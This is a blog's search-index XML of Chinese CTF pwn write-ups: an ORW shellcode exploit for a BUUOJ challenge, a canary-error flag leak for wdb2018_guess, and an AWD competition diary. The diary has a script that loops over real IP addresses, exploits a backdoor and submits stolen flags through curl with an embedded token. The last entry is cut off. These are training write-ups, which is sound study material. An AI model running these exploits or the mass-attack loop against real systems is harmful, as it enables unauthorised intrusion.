<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>该文章暂当图床</title>
      <link href="/2024/09/17/%E8%AF%A5%E6%96%87%E7%AB%A0%E6%9A%82%E5%BD%93%E5%9B%BE%E5%BA%8A/"/>
      <url>/2024/09/17/%E8%AF%A5%E6%96%87%E7%AB%A0%E6%9A%82%E5%BD%93%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/09/17/%E8%AF%A5%E6%96%87%E7%AB%A0%E6%9A%82%E5%BD%93%E5%9B%BE%E5%BA%8A/capture_20240727171132952.png"></p><p><img src="/2024/09/17/%E8%AF%A5%E6%96%87%E7%AB%A0%E6%9A%82%E5%BD%93%E5%9B%BE%E5%BA%8A/capture_20240727205848343.bmp"></p>]]></content>
      
      
      
        <tags>
            
            <tag> trash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019-Not_Bad</title>
      <link href="/2024/09/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad/"/>
      <url>/2024/09/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad/</url>
      
        <content type="html"><![CDATA[<h1 id="典型的ORW-mmap参数理解"><a href="#典型的ORW-mmap参数理解" class="headerlink" title="典型的ORW+mmap参数理解"></a>典型的ORW+mmap参数理解</h1><p><a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Not%20Bad">题目连接</a></p><p><font color="red">知识点</font></p><p>1.典型的沙箱，ORW</p><p>2.mmap参数的理解，参考<a href="https://zhuanlan.zhihu.com/p/527532465">这篇文章</a></p><h2 id="1-ida速览"><a href="#1-ida速览" class="headerlink" title="1.ida速览"></a>1.ida速览</h2><ul><li>已经修改了函数名，加入了沙箱</li></ul><p><img src="/2024/09/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad/capture_20240916154952629.bmp"></p><ul><li>发现是典型的ORW可用：</li></ul><p><img src="/2024/09/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad/capture_20240916155021894.bmp"></p><ul><li>查看一下主要部分：</li></ul><p><img src="/2024/09/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad/capture_20240916155002230.bmp"></p><p>存在明显的栈溢出，并且此题保护全关，可以直接写入shellcode。</p><h3 id="简单思路"><a href="#简单思路" class="headerlink" title="简单思路"></a>简单思路</h3><ul><li>关于mmap函数的参数可以参考开头的文章，此处的mmap会在指定的地址开辟一个0x1000的可写可执行区域(prot&#x3D;6，不可读)，因此我们可以在该地址写入shellcode，然后使之被调用就可以getflag。</li><li>具体的构造看下面吧：</li></ul><h2 id="2-完整分析"><a href="#2-完整分析" class="headerlink" title="2.完整分析"></a>2.完整分析</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可以先将已知的和需要的先构建出来</span></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line"><span class="comment"># 先构造好shellcode,典型的ORW</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure><ul><li>这里要解释一下read的第一个参数的含义，代表我要读的文件是第几个，即fd，所谓的3是因为</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> : <span class="built_in">stdin</span></span><br><span class="line"><span class="number">1</span> : <span class="built_in">stdout</span></span><br><span class="line"><span class="number">2</span> : <span class="built_in">stderr</span></span><br><span class="line"><span class="number">3</span> ：flag</span><br></pre></td></tr></table></figure><ul><li>shellcode是构造完了，但是这个shellcode的长度有0x52，能直接写吗？当然不行，栈空间不够啊，那要如何完成呢？</li><li>我们可以在栈开头调用一个read，再将这个shellcode输入到mmap的地址，最后改变rax为mmap地址，再call就好了，那么初始的构造就如下了：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>)) + asm(<span class="string">&quot;mov rax,0x123000;call rax&quot;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>这样我们就构造好了开始的结构，只要调用这个，再次输入shellcode，就可以getflag了，如何调用？可以参考我之前写的<a href="https://blog.csdn.net/zwb2603096342/article/details/139296136?spm=1001.2014.3001.5502">这篇博客</a></li><li>我们只需要将ret_address改为jmp_rsp的地址，此时ret相当于执行pop rip，将rsp的值弹给rip，那么此时的<strong>rip就是jmp_rsp</strong>，同时，也由于pop rip中的pop，导致rsp+8，此时rsp指向下一条语句，即”sub rsp;0x30;jmp rsp”,rip此时jmp_rsp,相当于执行这段语句，那么便会执行栈开头的系统调用了</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload += p64(jmp_rsp) + asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>) <span class="comment"># jmp_rsp为地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Easy shellcode, have fun!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><h2 id="3-完整EXP："><a href="#3-完整EXP：" class="headerlink" title="3.完整EXP："></a>3.完整EXP：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,28443)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">jmp_rsp =<span class="number">0x0000000000400a01</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先构造好shellcode,典型的ORW</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将shellcode写在mmap开辟的固定地址，然后call该地址，执行shellcode</span></span><br><span class="line"><span class="comment">#bug() </span></span><br><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>)) + asm(<span class="string">&quot;mov rax,0x123000;call rax&quot;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp) + asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Easy shellcode, have fun!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wdb2018_guess--canary报错利用</title>
      <link href="/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/"/>
      <url>/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="修改argv-0-使canary报错时泄露信息"><a href="#修改argv-0-使canary报错时泄露信息" class="headerlink" title="修改argv[0],使canary报错时泄露信息"></a>修改argv[0],使canary报错时泄露信息</h1><p><a href="https://buuoj.cn/challenges#wdb2018_guess">题目链接</a></p><p><a href="https://blog.csdn.net/Invin_cible/article/details/123042863">参考文章</a></p><p><font color="red">知识点：</font></p><p>1.<strong>canary报错的利用，熟悉报错的参数是什么</strong></p><p>2.<strong>__environ环境变量</strong></p><h2 id="1-ida速览"><a href="#1-ida速览" class="headerlink" title="1.ida速览"></a>1.ida速览</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __WAIT_STATUS stat_loc; <span class="comment">// [rsp+14h] [rbp-8Ch] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+30h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">56</span>]; <span class="comment">// [rsp+60h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">3LL</span>;</span><br><span class="line">  LODWORD(stat_loc.__uptr) = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  sub_4009A6(a1, a2, a3);</span><br><span class="line">  HIDWORD(stat_loc.__iptr) = open(<span class="string">&quot;./flag.txt&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( HIDWORD(stat_loc.__iptr) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;./flag.txt&quot;</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(SHIDWORD(stat_loc.__iptr), buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  close(SHIDWORD(stat_loc.__iptr));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This is GUESS FLAG CHALLENGE!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;you have no sense... bye :-) &quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_400A11() ) <span class="comment">// 此处创建子进程</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please type your guessing flag&quot;</span>);</span><br><span class="line">  gets(s2); <span class="comment">// 明显的栈溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, s2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You must have great six sense!!!! :-o &quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You should take more effort to get six sence, and one more challenge!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>是可以发现有三次fork创建子进程的，说明我们可以利用三次canary报错</p></li><li><p>为什么想到这个，是因为我们没有其他的输出的可以利用，所以想到这个。</p></li><li><p>大致的思路就是通过泄露flag在栈上的地址，然后通过canary报错输出出来，具体看下面的实现.</p></li></ul><h2 id="2-gdb调试"><a href="#2-gdb调试" class="headerlink" title="2.gdb调试"></a>2.gdb调试</h2><p>首先要patchelf，将环境改为glibc2.24，不然无法实现。</p><p><img src="/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916141131322.bmp"></p><p>发现报错部分出现了程序的名字，那么这个是什么呢？这个其实就是argv[0]，也就是说argv[0]会随着canary报错的时候输出出来，那如果我们将其改为某个函数的got表的内容，那是不是就可以输出其真实地址了，达到泄露libc的作用，下面来看看栈布局：</p><p><img src="/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916141833635.bmp"></p><ul><li>这里可以很清楚的看到输入的地址和argv[0]相差0x128,我们通过栈溢出覆盖此处的地址为got表地址即可泄露libc</li></ul><h3 id="1-泄露Libc："><a href="#1-泄露Libc：" class="headerlink" title="(1) 泄露Libc："></a>(1) 泄露Libc：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step1 -- 泄漏栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(puts_got)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_address : &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure><ul><li>看看实际效果</li></ul><p><img src="/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916143126078.bmp"></p><h3 id="2-通过-environ泄露环境变量地址"><a href="#2-通过-environ泄露环境变量地址" class="headerlink" title="(2)通过__environ泄露环境变量地址"></a>(2)通过__environ泄露环境变量地址</h3><p>关于__environ可以参考开头的文章</p><p><img src="/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916144643853.bmp"></p><ul><li>光标处就是__environ的地址，很明显该地址是在栈上的，因此我们泄露出该地址，就可以获得栈地址了.</li></ul><p><img src="/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916144655337.bmp"></p><ul><li>发现flag的地址与__environ的地址差距0x168，因此将environ的地址泄露出来,再减去0x168就是flag的地址，然后通过同样的溢出，就可以泄露flag了.(该flag是我本地建立的，为了调试方便)</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step2 -- 泄漏flag地址</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(environ)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">buf = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;buf(flag)_address : &#x27;</span>+<span class="built_in">hex</span>(buf))</span><br></pre></td></tr></table></figure><h3 id="3-泄露flag"><a href="#3-泄露flag" class="headerlink" title="(3),泄露flag"></a>(3),泄露flag</h3><p>直接看最后的EXP吧</p><p><img src="/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916145230691.bmp"></p><h2 id="3-最终EXP"><a href="#3-最终EXP" class="headerlink" title="3.最终EXP"></a>3.最终EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,28532)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 三次创建fork，相当于可以利用三次程序</span></span><br><span class="line"><span class="comment"># 第一次泄漏libc，第二次泄漏栈地址，第三次泄漏flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step1 -- 泄漏栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_address : &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">environ = base + libc.dump(<span class="string">&#x27;__environ&#x27;</span>) <span class="comment"># 环境变量的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 -- 泄漏flag地址</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(environ)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">buf = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;buf(flag)_address : &#x27;</span>+<span class="built_in">hex</span>(buf))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 -- 打印出flag</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(buf)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记第一次awd测试</title>
      <link href="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/"/>
      <url>/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="只针对pwn方向"><a href="#只针对pwn方向" class="headerlink" title="只针对pwn方向"></a>只针对pwn方向</h1><p><font size="4" color="red">题目：<strong>Bugku S3 AWD排位赛-13(双倍积分)</strong></font></p><p><font size="4" color="red">参考视频：<a href="https://www.bilibili.com/video/BV1FD4y147vu/?spm_id_from=333.337.search-card.all.click&vd_source=3a102c224ddc9fd26cd9c49207334603">AWD_哔哩哔哩_bilibili</a></font></p><p><font size="4" color="red">工具：</font></p><p><strong>Xterminal</strong>：<a href="https://www.xterminal.cn/">Xterminal - 更好用的开发工具，但不止于(SSH&#x2F;控制台&#x2F;More)</a></p><h3 id="1-ssh连接"><a href="#1-ssh连接" class="headerlink" title="1.ssh连接"></a>1.ssh连接</h3><ul><li>此处是结束之后写的，所以缺少截图了，不过可以看上面的参考视频。</li><li>开始比赛之前务必让队长给你本机ip加入到白名单上面</li><li>比赛开始，会有自己的虚拟ip地址，也会给队伍名和密码，队伍名类似于team1，密码较长。</li></ul><p><img src="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904222732662.bmp"></p><ul><li>类似上面的，我拿的是Xterminal连接，分组和名称乱填就行。</li></ul><h3 id="2-对pwn文件进行修复和攻击"><a href="#2-对pwn文件进行修复和攻击" class="headerlink" title="2.对pwn文件进行修复和攻击"></a>2.对pwn文件进行修复和攻击</h3><h4 id="2-1-攻击本地"><a href="#2-1-攻击本地" class="headerlink" title="2.1 攻击本地"></a>2.1 攻击本地</h4><ul><li>连接服务器之后，在&#x2F;home&#x2F;ctf文件下面有pwn文件，下载下来即可，拖进自己的虚拟机，然后跟正常的ctf比赛一样。</li><li>checksec一下文件，发现没canary也没有PIE</li></ul><p><img src="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904223824348.bmp"></p><p><img src="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904223741981.bmp"></p><p><img src="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904223748645.bmp"></p><ul><li><strong>从ida可以看出，直接给的pwn文件可以说没有任何保护，把能给的信息都给了，还给了栈上地址任意修改的权限，并且还给了后门函数。那么很简单，直接修改ret_addr为后门函数地址就可以得到flag了</strong>。</li></ul><p><img src="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904224136529.bmp"></p><h4 id="2-2-攻击远程"><a href="#2-2-攻击远程" class="headerlink" title="2.2 攻击远程"></a>2.2 攻击远程</h4><ul><li>远程其实跟做题目一样，得到ip地址，这一步靠web手将其他服务器的虚拟ip爆破出来(虚拟ip只有一位不同)，然后ping一下就有ip了</li><li><strong>端口问题</strong>：起初我以为是默认的2222，结果上网搜<a href="https://www.anquanke.com/post/id/256463">其他比赛的脚</a><a href="https://www.anquanke.com/post/id/256463">本</a>，发现端口其实是9999</li></ul><p><img src="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240902204946705.bmp"></p><ul><li><p><strong>得到的flag就可以直接提交了</strong></p></li><li><p>至于循环提交flag，这里贴一个脚本，但是最后也没来得及测试。脚本中爆破就爆破了一位，但其实后为ip地址都是不相同的</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="comment"># 本机ip: 47.104.214.84</span></span><br><span class="line"><span class="comment"># 其他ip: 47.104.195.88</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip = <span class="string">&quot;47.104.195.&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>)</span><br><span class="line">        p = remote(ip,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&quot;saved rbp\n&quot;</span>)</span><br><span class="line">        ret_addr = <span class="built_in">int</span>(p.recv()[<span class="number">1</span>:<span class="number">19</span>],<span class="number">16</span>)</span><br><span class="line">        success(<span class="string">&quot;ret_addr&quot;</span>,<span class="built_in">hex</span>(ret_addr))</span><br><span class="line">        p.send(<span class="built_in">str</span>(ret_addr))</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&quot; = &quot;</span>)</span><br><span class="line">        p.send(<span class="built_in">str</span>(<span class="number">0x00000000004011fa</span>))</span><br><span class="line">        flag = <span class="built_in">str</span>(p.recvuntil(<span class="string">b&#x27;\n\n&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        payload = <span class="string">&quot;curl https://ctf.bugku.com/pvp/submit.html?token=72b8175c72f2abe98330367a34bfa64a&amp;flag=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag)</span><br><span class="line">        os.system(payload)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(ip)</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;本轮共拿到&quot;</span>+<span class="built_in">str</span>(index)+<span class="string">&quot;个队伍flag&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="2-3-修复文件"><a href="#2-3-修复文件" class="headerlink" title="2.3 修复文件"></a>2.3 修复文件</h4><ul><li>因为是新手不会在ida patch改，所以上的是通防：<a href="https://github.com/TTY-flag/evilPatcher">https://github.com/TTY-flag/evilPatcher</a></li><li><font size="4" color="red">具体使用：</font></li></ul><p>1.安装seccomp-tools</p><p>2.git clone + 上面仓库地址.git，然后给pwn文件丢到目录下面</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 evilPatcher.py pwn sandboxs/mini_sandbox.asm</span><br></pre></td></tr></table></figure><p><img src="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904225530541.bmp"></p><p><font size="4"><strong>pwn.patch就是改了之后的文件</strong>，修改pwn.patch为pwn就行了</font></p><p><img src="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904225753998.bmp"></p><ul><li>可以发现，execve系统调用被禁用了，所以原来的脚本是打不通的。</li></ul><h4 id="2-4-远程上传"><a href="#2-4-远程上传" class="headerlink" title="2.4 远程上传"></a>2.4 远程上传</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">scp -P <span class="number">2222</span> filename_addr username@ip:/目录</span><br></pre></td></tr></table></figure><ul><li><p>filename_addr就是你要上传的文件绝对地址</p></li><li><p>username就是服务器地址，比如team1，ip就是ping一下你的虚拟ip然后的地址，后面目录就是你要上传到服务器的目录</p></li><li><p>做完这些是要输密码的，正常输入即可</p></li><li><p>一般我们的文件时上传到&#x2F;tmp目录下面，然后根据重定向写入到pwn文件中</p></li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">cat /tmp/pwn &gt; <span class="regexp">/home/</span>ctf/pwn</span><br></pre></td></tr></table></figure><p><img src="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904230324533.bmp"></p><ul><li>做完这些pwn手可以歇息了(对于我来说也可以歇息了，因为已经不会了)</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> awd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hitcon2014_stkof-unlink</title>
      <link href="/2024/09/03/hitcon2014-stkof-unlink/"/>
      <url>/2024/09/03/hitcon2014-stkof-unlink/</url>
      
        <content type="html"><![CDATA[<h1 id="unlink–只有add-free-edit"><a href="#unlink–只有add-free-edit" class="headerlink" title="unlink–只有add,free,edit"></a>unlink–只有add,free,edit</h1><p><a href="https://buuoj.cn/challenges#hitcon2014_stkof">题目链接</a></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><strong>unlink修改free_got，利用puts_got,puts_plt</strong></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/">文章链接</a></p><h2 id="题目速览"><a href="#题目速览" class="headerlink" title="题目速览"></a>题目速览</h2><h4 id="经典堆菜单"><a href="#经典堆菜单" class="headerlink" title="经典堆菜单"></a>经典堆菜单</h4><p><img src="/2024/09/03/hitcon2014-stkof-unlink/capture_20240903211652894.bmp"></p><h4 id="add："><a href="#add：" class="headerlink" title="add："></a>add：</h4><ul><li>注意先加一，才记录地址</li></ul><p><img src="/2024/09/03/hitcon2014-stkof-unlink/capture_20240903211718246.bmp"></p><h4 id="delete："><a href="#delete：" class="headerlink" title="delete："></a>delete：</h4><p><img src="/2024/09/03/hitcon2014-stkof-unlink/capture_20240903211711681.bmp"></p><h4 id="edit："><a href="#edit：" class="headerlink" title="edit："></a>edit：</h4><ul><li><font 